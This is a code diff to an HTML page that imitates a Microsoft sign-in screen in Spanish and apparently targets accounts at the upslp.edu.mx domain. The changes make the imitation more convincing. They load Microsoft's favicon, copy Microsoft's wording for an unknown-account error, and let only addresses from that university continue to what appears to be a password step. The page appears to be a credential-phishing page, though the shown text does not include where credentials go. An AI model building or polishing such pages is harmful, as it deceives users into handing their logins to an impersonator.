@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iniciar sesión en su cuenta</title>
     <style>
+    <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" />
         body, input, button {
             font-family: 'Segoe UI', Webfont, -apple-system, 'Helvetica Neue', Helvetica, Roboto, Arial, sans-serif;
         }
@@ -126,6 +127,20 @@
             font-size: 15px;
             color: #1b1b1b;
         }
+        .error-message {
+            color: #e81123; 
+            font-size: 13px;
+            margin-top: -15px;
+            margin-bottom: 15px;
+            display: none; 
+        }
+        .error-message a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .error-message a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -135,6 +150,9 @@
 
         <div id="step-1">
             <h2>Iniciar sesión</h2>
+            <div id="error-mail" class="error-message">
+                No hemos podido encontrar ninguna cuenta con ese nombre de usuario. Escriba otra dirección u <a href="#">obtenga una nueva cuenta de Microsoft.</a>
+            </div>
             <input type="email" id="userEmail" placeholder="usuario@upslp.edu.mx" required>
             <div class="footer-links">¿No puede acceder a su cuenta?</div>
             
@@ -168,13 +186,20 @@
 
     <script>
         function nextStep() {
-            var email = document.getElementById("userEmail").value;
-            if(email !== "") {
-                document.getElementById("displayEmail").innerText = email;
+            var emailInput = document.getElementById("userEmail");
+            var emailValue = emailInput.value;
+            var errorDiv = document.getElementById("error-mail");
+            
+            if(emailValue !== "" && emailValue.includes("@upslp.edu.mx")) {
+                errorDiv.style.display = "none";
+                emailInput.style.borderBottom = "1px solid #666";
+                
+                document.getElementById("displayEmail").innerText = emailValue;
                 document.getElementById("step-1").style.display = "none";
                 document.getElementById("step-2").style.display = "block";
             } else {
-                alert("Por favor, escriba un correo válido.");
+                errorDiv.style.display = "block";
+                emailInput.style.borderBottom = "2px solid #e81123";
             }
         }
 
